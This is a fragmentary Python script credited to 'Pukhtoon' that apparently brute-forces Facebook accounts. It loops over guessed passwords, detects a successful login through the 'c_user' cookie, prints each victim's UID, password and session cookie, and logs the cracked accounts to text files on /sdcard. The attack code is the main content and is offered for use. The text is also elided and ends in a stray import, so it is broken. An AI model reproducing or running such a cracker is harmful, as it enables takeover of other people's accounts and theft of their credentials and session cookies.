...
| $$     \\$$    $$ \$$ $$ $$| $$  \$ | $$| $$  | $$| $$  \$$$
 ...
 \$$$$$$$$ \$$$$$$   \$$$$$$\ \$$      \$$ \$$   \$$ \$$   \$$
               ...
               please channel subscribe krdo                                                

==============================

Author   :     Pukhtoon

 Facebook :     MRPUKHTOONOO
...
def checks(oks,cps,twf):
    ...
    if len(cps) != 0:
        ...
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mPUKHTOON-OK.txt' % (

            H, P, str(len(oks))))

        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mPUKHTOON-CP.txt' %

              (H, P, str(len(cps))))

        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mPUKHTOON-2F.txt' %
...
def xyz():
    ...
    PUKHTOON = input("[âˆš] CHOOSE : ")

    if PUKHTOON in ["1","01"]:

        Tabii()

    elif PUKHTOON in ["0","00"]:
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[âˆš]---------------------[PUKHTOON-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')

                cek_apk(session,coki)

                open('/sdcard/PUKHTOON-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                open('/sdcard/PUKHTOON-2F.txt', 'a').write(cid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r\33[1;37m[PUKHTOONðŸ¤­] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
...
if __name__ == '__main__':
    ...
    xyz()from bs4 import BeautifulSoup as sop
